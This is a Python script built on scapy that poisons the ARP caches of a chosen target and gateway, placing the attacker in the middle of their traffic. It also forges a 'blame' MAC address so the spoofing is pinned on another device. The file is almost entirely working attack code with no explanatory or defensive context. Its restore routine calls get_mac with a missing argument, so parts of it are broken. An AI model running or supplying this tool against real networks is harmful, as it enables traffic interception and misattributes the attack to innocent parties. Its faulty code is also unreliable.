#!/usr/bin/env python
import scapy.all as scapy
import argparse
import time
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    parser.add_argument("-b","--blame",dest="blame",help="Specify blaming mac")
    return parser.parse_args()

def get_mac(ip,blame):
    arp_packet = scapy.ARP(pdst=ip,hwsrc=blame)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff",src=blame)
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=5, verbose=False)
    if(len(answered_list[0]) != 0):
        return answered_list[0][0][1].hwsrc
    return get_mac(ip)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count = 4, verbose=False)

def spoof(target_ip, spoof_ip,target_mac,blame):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc = blame)
    scapy.sendp(packet, verbose=False)


arguments = get_arguments()
sent_packets = 0
try:
    blame = arguments.blame
    gateway_mac =  get_mac(arguments.gateway,blame)
    target_mac = get_mac(arguments.target,blame)
    while True:
        spoof(arguments.target, arguments.gateway,target_mac,blame)
        spoof(arguments.gateway, arguments.target,gateway_mac,blame)
        sent_packets += 2
        print("\r[+] Sent packets: " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
    restore(arguments.target,arguments.gateway)
    restore(arguments.gateway, arguments.target)
